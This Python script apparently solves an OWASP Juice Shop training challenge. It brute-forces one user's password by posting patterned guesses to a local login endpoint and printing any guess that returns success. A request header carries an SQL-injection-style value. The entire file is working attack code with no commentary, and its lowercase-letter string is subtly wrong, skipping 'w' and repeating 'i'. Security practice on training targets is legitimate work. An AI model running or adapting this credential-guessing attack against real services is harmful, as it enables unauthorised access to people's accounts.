import requests


burp0_url = "http://localhost:3000/rest/user/login"
burp0_cookies = {"language": "en", "cookieconsent_status": "dismiss", "welcomebanner_status": "dismiss", "continueCode": "M1HRhntQIVSyt3coIrTwfwHph2t8slbuM9IKDTkOuX7hMWIOJFbvteQcq9UzZuJL"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "X-User-Email": "jim@juice-sh.op'--", "Content-Type": "application/json", "Origin": "http://localhost:3000", "Connection": "keep-alive", "Referer": "http://localhost:3000/"}

uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
lowercase_letters = "abcdefghijklmniopqrstuvxyz"
numbers = "0123456789"
for up_letter in uppercase_letters:
    for low_letter in lowercase_letters:
        for number in numbers:
            burp0_json={"email": "amy@juice-sh.op", "password": f"{up_letter}{number}{low_letter}....................."}
            response=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json);
            #print(burp0_json)
            #if "Invalid" not in response.text:
            #   print("the true credintials is " + str(burp0_json))
            if (response.status_code == 200):
                print(" credintial is " + str(burp0_json))